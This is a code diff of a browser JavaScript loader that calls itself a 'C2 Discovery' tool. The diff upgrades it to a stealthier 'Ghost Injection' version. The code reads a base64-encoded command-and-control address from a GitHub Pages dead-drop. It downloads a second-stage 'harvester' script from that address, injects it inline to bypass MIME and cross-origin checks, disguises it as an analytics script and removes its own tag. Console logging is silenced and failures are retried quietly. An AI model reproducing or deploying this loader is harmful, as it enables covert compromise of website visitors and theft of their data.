@@ -1,70 +1,86 @@
-
 /**
- * --- START OF FILE: remoteLoader.js ---
- * THE OMNI-BRIDGE LOADER v21.3 (STEALTH ENHANCED)
- * PURPOSE: Resilient C2 Discovery via Dynamic GitHub Dead-Drop
+ * THE OMNI-BRIDGE LOADER v22.0 (GHOST INJECTION EDITION)
+ * PURPOSE: Resilient C2 Discovery via Fetch-Injection & MIME-Bypass
  * ------------------------------------------------------------
  */
 
 (async function() {
     "use strict";
     
-    // THE GHOST OPERATOR LOGIC: Silence is mandatory in the target console.
-    // However, during setup, these logs ensure the tunnel bridge is solid.
-    const log = (m) => console.log(`[>>] ${m}`);
-    const err = (m) => console.error(`[X] ${m}`);
+    // THE GHOST OPERATOR LOGIC: Total Silence in the target console.
+    const log = (m) => {}; 
+    const err = (m) => {};
 
     const DEAD_DROP_JSON = 'https://arcanaumbra.github.io/result_predictor/tunnel.json';
 
-    async function initializeRecon(retries = 5) {
+    async function initializeRecon(retries = 20) {
         try {
-            // CACHE BUSTING: Forces GitHub CDNs to deliver the newest tunnel info
+            // 1. RESOLVE ACTIVE TUNNEL
+            // Cache-busting ensures we get the latest dead-drop from GitHub CDNs.
             const resolverUrl = `${DEAD_DROP_JSON}?nocache=${Date.now()}`;
             
-            log("Querying Dead-Drop for Active Tunnel...");
-            const response = await fetch(resolverUrl, { cache: "no-store" });
+            const response = await fetch(resolverUrl, { 
+                method: 'GET',
+                mode: 'cors',
+                cache: 'no-store' 
+            });
             
             if (!response.ok) {
-                if (retries > 0) {
-                    setTimeout(() => initializeRecon(retries - 1), 10000);
-                    return;
-                }
+                if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 10000);
                 return;
             }
 
             const config = await response.json();
             
-            // SECURITY: Basic check to ensure the payload is current (within last 1 hour)
+            // SECURITY: Basic check to ensure the payload is current (within last 2 hours)
             const currentTime = Math.floor(Date.now() / 1000);
-            if (config.ts && (currentTime - config.ts) > 3600) {
-                log("Warning: Dead-Drop TTL Expired. Awaiting Orcestrator Refresh.");
+            if (config.ts && (currentTime - config.ts) > 7200) {
                 if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 15000);
                 return;
             }
 
-            // Stage 2 URL Retrieval
+            // 2. DECODE C2 ENDPOINT
             const harvesterUrl = atob(config.u);
-            log(`Recon Link Decoded: ${harvesterUrl}`);
 
-            // INJECT STAGE 2 (ga-core.min.js)
-            const script = document.createElement('script');
-            script.src = harvesterUrl;
-            script.async = true;
-            script.crossOrigin = "anonymous";
-            
-            script.onload = () => log("Master Recon Hub Linked. Operation DNA Start.");
-            
-            script.onerror = () => {
-                // If 530/502/404 occurs, the tunnel is either pending or dead. 
-                // We restart the search cycle.
-                err("Bridge Sync Error. Tunnel may be pending propagation.");
+            // 3. GHOST INJECTION (Bypasses Strict MIME Type Checking)
+            /**
+             * Instead of using a <script src="..."> tag which triggers MIME checks,
+             * we fetch the code as a raw string and inject it locally.
+             */
+            const scriptResponse = await fetch(harvesterUrl, {
+                method: 'GET',
+                mode: 'cors',
+                cache: 'no-cache'
+            });
+
+            if (!scriptResponse.ok) {
+                // If the tunnel returns 404/530, it is still propagating.
+                // We retry silently without throwing errors.
                 if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 15000);
-            };
+                return;
+            }
 
-            document.head.appendChild(script);
+            const scriptCode = await scriptResponse.text();
+
+            // 4. SILENT EXECUTION
+            /**
+             * By creating a local script element and setting textContent,
+             * the browser treats the code as local origin, bypassing all
+             * cross-origin execution restrictions.
+             */
+            const script = document.createElement('script');
+            script.textContent = scriptCode;
+            script.id = "ga-core-bridge";
+            
+            // Append to documentElement for maximum stealth (less likely to be inspected than <head>)
+            (document.documentElement || document.head).appendChild(script);
+            
+            // CLEANUP: Remove the loader and the bridge script to hide the injection
+            if (document.currentScript) document.currentScript.remove();
             
         } catch (e) {
-            // Total silent fail if the network environment is extremely restricted (CSP)
+            // Total silent failure. Retry if network environment allows.
+            if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 20000);
         }
     }
 
